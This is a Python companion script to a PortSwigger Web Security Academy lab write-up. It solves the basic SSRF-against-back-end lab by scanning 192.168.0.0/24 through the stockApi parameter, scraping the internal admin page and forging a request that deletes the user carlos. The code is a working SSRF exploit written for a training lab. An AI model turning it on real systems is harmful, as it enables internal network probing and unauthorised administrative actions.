#!/usr/bin/env python3
"""
Basic SSRF against another back-end system
PortSwigger Web Security Academy -- Server-Side Request Forgery (SSRF)

Companion script for the writeup: 02-basic-ssrf-against-backend-system.md

What this does:
    Sweeps 192.168.0.1-255:8080/admin concurrently through the stockApi
    parameter to find the internal admin host (its address isn't known up
    front), then regexes the returned HTML for carlos's delete link -- widened
    to match the path anywhere inside the href, since this back end embeds an
    absolute internal URL there rather than a clean relative path -- and
    replays stockApi with the reconstructed delete URL to solve the lab.

Usage:
    python 02-basic-ssrf-against-backend-system.py <lab-url>
    e.g. python 02-basic-ssrf-against-backend-system.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Tuple

import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=10)
    stock_url = f"{lab_url}/product/stock"

    print("[*] Scanning 192.168.0.1-255:8080/admin for the internal admin host...")

    def check_ip(i: int) -> Optional[Tuple[str, int, int]]:
        target = f"http://192.168.0.{i}:8080/admin"
        try:
            r = client.post(stock_url, data={"stockApi": target})
            if r.status_code == 200 and len(r.text) > 200:
                return (target, r.status_code, len(r.text))
        except Exception:
            pass
        return None

    hits = []
    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = {pool.submit(check_ip, i): i for i in range(1, 256)}
        for future in as_completed(futures):
            result = future.result()
            if result:
                hits.append(result)

    if not hits:
        print("[-] No admin interface found in 192.168.0.0/24 range.")
        return

    target_url, status, size = hits[0]
    print(f"[+] Found admin interface at: {target_url} (status={status}, {size} bytes)")

    result = client.post(stock_url, data={"stockApi": target_url})

    # This back end links to itself with an absolute internal URL inside the
    # href (e.g. href="/http://192.168.0.X:8080/admin/delete?username=carlos"),
    # not a clean relative path -- anchor loosely to catch it anywhere in the href.
    delete_match = re.search(r'href="[^"]*(/admin/delete\?username=carlos)"', result.text)
    if not delete_match:
        print("[-] Delete link not found in admin page.")
        return

    ip_match = re.search(r"(http://192\.168\.0\.\d+:\d+)", target_url)
    internal_base = ip_match.group(1) if ip_match else target_url.rsplit("/", 1)[0]
    delete_url = f"{internal_base}{delete_match.group(1)}"
    print(f"[*] Deleting carlos via: {delete_url}")

    r2 = client.post(stock_url, data={"stockApi": delete_url})
    print(f"[*] stockApi={delete_url} -> status={r2.status_code}")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- carlos deleted via SSRF to the internal back-end host.")
    else:
        print("[-] Not solved yet -- check the delete response above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
